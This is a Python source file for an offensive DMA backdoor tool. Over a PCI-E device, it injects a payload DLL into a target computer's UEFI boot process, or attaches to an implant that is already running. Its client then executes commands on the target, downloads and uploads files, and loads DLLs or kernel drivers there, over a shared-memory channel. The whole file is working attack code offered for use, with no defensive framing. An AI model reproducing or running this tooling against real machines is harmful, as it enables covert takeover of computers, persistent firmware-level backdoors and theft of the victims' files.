#!/usr/bin/env python

import sys, os, time, random
from socket import htonl
from struct import pack, unpack
from optparse import OptionParser

from pcie_lib import *
from uefi_backdoor_boot import *

# MEM_SHARED location
MEM_ADDR_LO = 0x00010000
MEM_ADDR_HI = 0xfffff000

# payload DLL file
PAYLOAD_PATH = os.path.join(os.path.dirname(os.path.realpath(__file__)), \
               'payloads/DmaBackdoorBoot/backdoor/dma_shell_debug.dll')


class Transport(object):

    # MEM_SHARED_HEADER signature
    MEM_SIGN = 0x92de7fc0

    # MEM_SHARED_HEADER structure size
    MEM_HEADER_LEN = (3 * 4)

    MEM_SIZE = PAGE_SIZE
    MEM_DATA_SIZE = ((MEM_SIZE / 2) - MEM_HEADER_LEN)

    # MEM_SHARED_HEADER offsets for transmit and receive channels
    MEM_TX = 0
    MEM_RX = (MEM_SIZE / 2)

    # MEM_SHARED_HEADER fields
    MEM_REG_SIGN    = 0
    MEM_REG_COMMAND = 1
    MEM_REG_SIZE    = 2

    # shared region commands
    MEM_CMD_IDLE    = 0     # wait for the command
    MEM_CMD_TXD     = 1     # transfer the data chunk
    MEM_CMD_ACK     = 2     # data chunk was transfered
    MEM_CMD_RST     = 3     # abort transfer

    # in seconds
    IO_TIMEOUT = 3

    class Error(Exception):

        # base transport exception class
        pass

    class ErrorTimeout(Error):

        pass

    class ErrorBadCommand(Error):

        pass    

    def __init__(self, dev, shared_addr):

        self.recv_ptr = 0
        self.dev, self.shared_addr = dev, shared_addr

        # sanity check
        assert self.tx_reg_get(self.MEM_REG_SIGN) == self.MEM_SIGN
        assert self.rx_reg_get(self.MEM_REG_SIGN) == self.MEM_SIGN

    def tx_reg(self, reg): 

        # get transmit channel register address
        return self.shared_addr + self.MEM_TX + (reg * 4)

    def rx_reg(self, reg): 

        # get receive channel register address
        return self.shared_addr + self.MEM_RX + (reg * 4)

    def tx_reg_get(self, reg):

        # read transmit region register
        return self.dev.mem_read_4(self.tx_reg(reg))

    def rx_reg_get(self, reg):

        # read receive channel register
        return self.dev.mem_read_4(self.rx_reg(reg))

    def tx_reg_set(self, reg, val):

        # write transmit channel register
        self.dev.mem_write_4(self.tx_reg(reg), val)    

    def rx_reg_set(self, reg, val):

        # write receive channel register
        self.dev.mem_write_4(self.rx_reg(reg), val)

    def tx_copy(self, data):

        assert len(data) <= self.MEM_DATA_SIZE

        # write transmit data
        self.dev.mem_write(self.shared_addr + self.MEM_TX + self.MEM_HEADER_LEN, data)

    def rx_copy(self, size, ptr = 0):

        assert size + ptr <= self.MEM_DATA_SIZE

        # read receive data
        return self.dev.mem_read(self.shared_addr + self.MEM_RX + self.MEM_HEADER_LEN + ptr, size)

    def tx_wait(self, command, timeout = None):

        started = time.time()

        while True:

            ret = self.tx_reg_get(self.MEM_REG_COMMAND)

            # check for the changed command
            if ret != command:

                return ret

            if timeout is not None and time.time() - started > timeout:

                raise(self.ErrorTimeout('Transmit timeout occurred'))

    def rx_wait(self, command, timeout = None):

        started = time.time()

        while True:

            ret = self.rx_reg_get(self.MEM_REG_COMMAND)

            # check for the changed command
            if ret != command:

                return ret

            if timeout is not None and time.time() - started > timeout:

                raise(self.ErrorTimeout('Receive timeout occurred'))

    def send(self, data):

        sent = 0

        while sent < len(data):

            chunk_len = min(len(data) - sent, self.MEM_DATA_SIZE)

            self.tx_copy(data[sent : sent + chunk_len])

            # start chunk transfer
            self.tx_reg_set(self.MEM_REG_SIZE, chunk_len)
            self.tx_reg_set(self.MEM_REG_COMMAND, self.MEM_CMD_TXD)

            # wait for the completion
            command = self.tx_wait(self.MEM_CMD_TXD, timeout = self.IO_TIMEOUT)

            # check for acknowledgement from the target
            if command != self.MEM_CMD_ACK:

                raise(self.ErrorBadCommand('Bad command %d during transmit' % command))

            sent += chunk_len

        # indicate end of the transfer
        self.tx_reg_set(self.MEM_REG_COMMAND, self.MEM_CMD_IDLE)

    def recv(self, size, timeout = None):

        received, ret = 0, ''
        timeout = self.IO_TIMEOUT if timeout is None else timeout

        while received < size:

            # wait for the target command
            command = self.rx_wait(self.MEM_CMD_IDLE, timeout = timeout)

            # check for incomnig data from the target
            if command != self.MEM_CMD_TXD:

                raise(self.ErrorBadCommand('Bad command %d during receive' % command))

            # determine number of bytes to copy
            recv_size = self.rx_reg_get(self.MEM_REG_SIZE) - self.recv_ptr
            chunk_size = min(size - received, recv_size)

            ret += self.rx_copy(chunk_size, ptr = self.recv_ptr)

            if chunk_size < recv_size:

                # remember remaining amount of data to copy
                self.recv_ptr += chunk_size

                # requested amount of data was received
                return ret

            else:

                # whole chunk was copied
                self.recv_ptr = 0

            # set receive acknowledgement
            self.rx_reg_set(self.MEM_REG_COMMAND, self.MEM_CMD_ACK)

            # wait for the next chunk of data
            self.rx_wait(self.MEM_CMD_ACK, timeout = self.IO_TIMEOUT)

            received += chunk_size

        return ret


class Client(Transport):

    # command execution timeout in seconds
    EXEC_TIMEOUT = 20

    # chunk size to transfer the file data
    IO_BUFF_SIZE = Transport.MEM_DATA_SIZE

    # control protocol commands
    PROT_CMD_ERROR      = 0
    PROT_CMD_SUCCESS    = 1
    PROT_CMD_PING       = 2 
    PROT_CMD_EXEC       = 3
    PROT_CMD_DOWNLOAD   = 4
    PROT_CMD_UPLOAD     = 5
    PROT_CMD_LOAD_IMAGE = 6

    class Error(Exception):

        # base client exception class
        pass

    class ErrorExecute(Error):

        # for execute() method
        pass

    class ErrorDownload(Error):

        # for download() method
        pass

    class ErrorUpload(Error):

        # for upload() method
        pass

    class ErrorLoadImage(Error):

        # for load_image() method
        pass

    def str_encode(self, string):

        # Win API functions on the target needs null terminated UTF-16 strings
        return string.encode('UTF-16')[2 :] + '\0\0'

    def request(self, code, data = None, no_reply = False, timeout = None):

        data = '' if data is None else data

        # send request
        self.send(pack('II', code, len(data)) + data)

        # receive reply
        code, size = unpack('II', self.recv(4 * 2, timeout = timeout))

        if no_reply:

            # return reply size rather than receiving it
            return code, size            

        if size > 0:

            # receive reply data
            data = self.recv(size)

        else:

            data = None

        return code, data

    def ping(self):

        # ping the target
        code, data = self.request(self.PROT_CMD_PING)

        # check reply code
        assert data is None
        assert code == self.PROT_CMD_SUCCESS

    def execute(self, command, timeout = None):        

        # encode command as null terminated UTF-16 string
        command = self.str_encode(command)

        timeout = self.EXEC_TIMEOUT if timeout is None else timeout
        timeout = timeout * 1000

        # send PROT_CTL_EXEC_REQUEST
        code, data = self.request(self.PROT_CMD_EXEC, data = pack('I', timeout) + command, 
                                  timeout = timeout + (self.IO_TIMEOUT * 1000))

        assert len(data) >= 4
        assert code in [ self.PROT_CMD_SUCCESS, self.PROT_CMD_ERROR ]

        # parse PROT_CTL_EXEC_REPLY
        exit_code, data = unpack('I', data[: 4]), data[4 :].decode('UTF-8')

        # check if command was executed
        if code != self.PROT_CMD_SUCCESS:

            assert len(data) == 0
            raise(self.ErrorExecute('Error %d while executing command on the target' % exit_code))

        return exit_code, data

    def download(self, src_path, dst_path = None):

        # encode file path as null terminated UTF-16 string
        src_path = self.str_encode(src_path)

        # send download file request
        code, size = self.request(self.PROT_CMD_DOWNLOAD, data = src_path, no_reply = True)

        if code != self.PROT_CMD_SUCCESS:

            assert size == 0
            raise(self.ErrorDownload('Error while downloading file from the target'))

        assert size != 0
        
        received, fd, ret = 0, None, ''

        if dst_path is not None:

            # create destination file
            fd = open(dst_path, 'wb')

        while received < size:

            # receive file chunk
            chunk_size = min(size - received, self.IO_BUFF_SIZE)
            data = self.recv(chunk_size)

            if fd is not None:

                # write data into the file
                fd.write(data)

            else:

                # just return the data
                ret += data

            received += chunk_size     

        if fd is not None:

            fd.close()

        else:

            return ret

    def upload(self, dst_path, src_path = None, data = None):

        fd, size = None, 0

        # encode file path as null terminated UTF-16 string
        dst_path = self.str_encode(dst_path)

        assert src_path is not None or data is not None

        if src_path is not None:

            # open source file
            fd = open(src_path, 'rb')
            size = os.path.getsize(src_path)

        else:

            size = len(data)

        # send upload file request
        code, data = self.request(self.PROT_CMD_UPLOAD, data = pack('I', size) + dst_path)

        assert data is None

        if code != self.PROT_CMD_SUCCESS:

            raise(self.ErrorUpload('Error while uploading file to the target'))

        sent = 0

        while sent < size:

            # send file chunk to the target
            chunk_size = min(size - sent, self.IO_BUFF_SIZE)
            
            if fd is not None:

                self.send(fd.read(chunk_size))

            else:

                self.send(data[sent : sent + chunk_size])

            sent += chunk_size

        if fd is not None:

            fd.close()

    def load_image(self, path = None, data = None):

        assert path is not None or data is not None

        if path is not None:

            with open(path, 'rb') as fd:

                # read image contents from the file
                data = fd.read()

        # send upload file request
        code, data = self.request(self.PROT_CMD_LOAD_IMAGE, data = data)

        assert data is None

        if code != self.PROT_CMD_SUCCESS:

            raise(self.ErrorLoadImage('Error while loading image to the target'))


def deploy(payload = None, method = None, system_table = None, prot_entry = None):

    # perform pre-boot DMA attack to inject the backdoor
    dev = inject(payload = payload, method = method, system_table = system_table, prot_entry = prot_entry)
    if dev is None:

        # error while initializing the backdoor
        return None

    print('[+] Waiting for payload init...')

    while True:

        try:

            # receive TLP
            tlp = dev.read()

            # check for memory write TLP type
            assert isinstance(tlp, dev.PacketMWr32)

            # check write address
            assert tlp.addr == dev.cfg_reg(CFG_BASE_ADDRESS_0)

            # check write size
            assert tlp.bytes_write == 8

            # get lower dword of physical address
            shared_addr = htonl(tlp.data[0])            

            return Client(dev, shared_addr)

        except dev.ep.ErrorTimeout:

            continue


def attach():

    # open device
    dev = TransactionLayer()    
    ptr = MEM_ADDR_LO

    assert dev_id_encode(*dev.bus_id) != 0

    print('[+] PCI-E link with target is up')
    print('[+] Device address is %.2x:%.2x.%x' % dev.bus_id)

    # locate MEM_SHARED in physical memory
    while ptr < MEM_ADDR_HI:

        try:

            # check for the MEM_SHARED_HEADER signature
            if dev.mem_read_8(ptr + Transport.MEM_TX) == Transport.MEM_SIGN and \
               dev.mem_read_8(ptr + Transport.MEM_RX) == Transport.MEM_SIGN:

                return Client(dev, ptr)

        except dev.ErrorBadCompletion:

            pass

        ptr += PAGE_SIZE

    dev.close()

    print('ERROR: Unable to locate payload shared memory region')

    return None


def main():

    parser = OptionParser()    

    parser.add_option('-s', '--system-table', dest = 'system_table', default = None,
        help = 'EFI_SYSTEM_TABLE address')    

    parser.add_option('-e', '--prot-entry', dest = 'prot_entry', default = None,
        help = 'PROTOCOL_ENTRY address')

    parser.add_option('-c', '--command', dest = 'command', default = None,
        help = 'execute command on target')

    parser.add_option('-d', '--download', dest = 'download', default = None,
        help = 'download file from the target')

    parser.add_option('-u', '--upload', dest = 'upload', default = None,
        help = 'upload file to the target')

    parser.add_option('-l', '--load-image', dest = 'load_image', default = None,
        help = 'load DLL or kernel driver image to the target')

    parser.add_option('-p', '--path', dest = 'path', default = None,
        help = 'destination file path for --upload and --download')

    parser.add_option('-t', '--timeout', dest = 'timeout', default = None,
        help = 'command execution timeout for --command')

    parser.add_option('--payload', dest = 'payload', default = None,
        help = 'override PAYLOAD_PATH variable')

    parser.add_option('-a', '--attach', dest = 'attach', default = False, action = 'store_true',
        help = 'attach to already running backdoor')  

    parser.add_option('--debug-output', dest = 'debug_output', default = False, action = 'store_true',
        help = 'read DXE driver debug output')    

    parser.add_option('--inj-prot', dest = 'inj_prot', default = False, action = 'store_true',
        help = 'use DXE protocol hook injection method')

    # parse command line
    options, _ = parser.parse_args()

    options.timeout = None if options.timeout is None else int(options.timeout)
    options.system_table = None if options.system_table is None else int(options.system_table, 16)
    options.prot_entry = None if options.prot_entry is None else int(options.prot_entry, 16)    

    if options.upload is not None and options.path is None:

        print('ERROR: Specify destination file path with --path')
        return -1

    try:

        if options.debug_output:

            # read and print debug messages of DXE driver
            return print_debug_output()

        elif options.attach:

            # attach to the backdoor
            client = attach()

        else:

            # deploy the backdoor
            client = deploy(payload = PAYLOAD_PATH if options.payload is None else options.payload, 
                            method = DXE_INJECT_PROT if options.inj_prot else DXE_INJECT_ST, 
                            system_table = options.system_table, prot_entry = options.prot_entry)

        if client is None:

            # error occurred
            return -1

        print('[+] Payload shared memory region is at 0x%.8x' % client.shared_addr)   

        # ping the client to ensure that transport and protocol are working
        client.ping()

        if options.command:

            print('[+] Executing command: %s' % options.command)

            # execute the command
            exit_code, output = client.execute(options.command, timeout = options.timeout)

            print('[+] Process exit code: 0x%.8x\n' % exit_code)

            print('%s' % output)

        elif options.download:

            if options.path is None:

                # destination file name from download path
                options.path = options.download.replace('\\', '/').split('/')[-1]

            print('[+] Downloading file %s from the target...' % options.download)

            # download file from the target
            client.download(options.download, dst_path = options.path)
                
            print('[+] %d bytes was written to the %s' % (os.path.getsize(options.path), options.path))

        elif options.upload:  

            print('[+] Uploading file %s to the target...' % options.upload)

            # upload file to the target
            client.upload(options.path, src_path = options.upload)
                
            print('[+] %d bytes was written to the %s' % (os.path.getsize(options.upload), options.path))

        elif options.load_image:

            print('[+] Loading image file %s to the target...' % options.load_image)

            # load executable image to the target
            client.load_image(path = options.load_image)
                
            print('[+] Image was successfully loaded')

        return 0

    except AssertionError:

        raise

    except KeyboardInterrupt:

        print('\n')    

    except Exception, why:

        print('ERROR: %s' % str(why))

    return -1

if __name__ == '__main__':

    exit(main())

#
# EoF
#
